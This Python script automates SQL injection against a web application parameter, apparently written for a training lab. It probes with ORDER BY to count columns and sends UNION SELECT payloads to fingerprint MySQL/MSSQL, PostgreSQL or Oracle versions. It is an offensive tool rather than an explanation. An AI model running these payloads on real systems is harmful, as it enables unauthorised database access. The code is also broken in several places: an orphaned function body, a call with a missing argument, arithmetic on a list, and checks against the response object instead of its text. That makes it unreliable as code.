import requests 
import sys 
import urllib3
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Conestractor(url,parameter):
    res = url + parameter
    if '//' in res:
        res = res.replace('//','/')
    # URL encoding
    # res = urllib.parse.quote(res)
    return res

def exploit_column_number(url):
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url+ sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
            break
        i = i + 1
    return False

# def string_field(url, num_col):
    for i in range(1, num_col+1):
        string = "'test'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False


def exploit_version(url,numofColumns):
    null_Operator = numofColumns * ['NULL']
    #MSSQL & MySQL ' UNION SELECT @@version
    MSSQL_MYSQL_payload = "%27UNION%20SELECT%20"+'%2C'.join(null_Operator)+"%40%40version--"
    r = requests.get(url + MSSQL_MYSQL_payload,verify=False, proxies=proxies)
    if "Internal Server Error" in r:
        return "[+] MySQL OR MSSQL data base"
    #PostgreSQL ' UNION SELECT version()
    PostgreSQL_payload = "%27UNION%20SELECT%20"+'%2C'.join(null_Operator)+"version%28%29--"
    r = requests.get(url + PostgreSQL_payload,verify=False, proxies=proxies)
    if "Internal Server Error" in r:
        return "[+] PostgreSQL data base"
    #Oracle ' UNION SELECT banner FROM v$version / ' UNION SELECT version FROM v$instance
    Oracle_payload1= "%27UNION%20SELECT%20banner%2C" +'%2C'.join(null_Operator - 1) +"%20FROM%20v%24version--"
    r = requests.get(url + Oracle_payload1,verify=False, proxies=proxies)
    if "Internal Server Error" in r:
        return "[+] Oracle data base"
    Oracle_payload2= "%27UNION%20SELECT%20banner%2C"+'%2C'.join(null_Operator - 1)+"%20FROM%20v%24instance--"
    r = requests.get(url + Oracle_payload2,verify=False, proxies=proxies)
    if "Internal Server Error" in r:
        return "[+] Oracle data base"

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        parameter = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <parameter>" % sys.argv[0])
        print("[-] Example: %s www.example.com '/filter?category=Gifts'" % sys.argv[0])
        sys.exit(-1)

    finalURL = Conestractor(url,parameter)
    print(f"FINAL URL : {finalURL}")
    print("[+] Getting number of columns...")
    num_col = exploit_column_number(finalURL)
    if num_col:
        print(f"[+] Number of columns = {num_col}")
    else:
        print("[-] Unsuccessful to get number of columns.") 
    
    # string_column = string_field(url, num_col)
    # if string_column:
    #     print("[+] The column that contains text is " + str(string_column) + ".")
    # else:
    #     print("[-] We were not able to find a column that has a string data type.")
    
    print("[+] Dumping the version of the database...")
    version = exploit_version(finalURL)
    if version:
        print(f"The db is {version}")
    else:    
        print("[-] Unable to dump the database version.")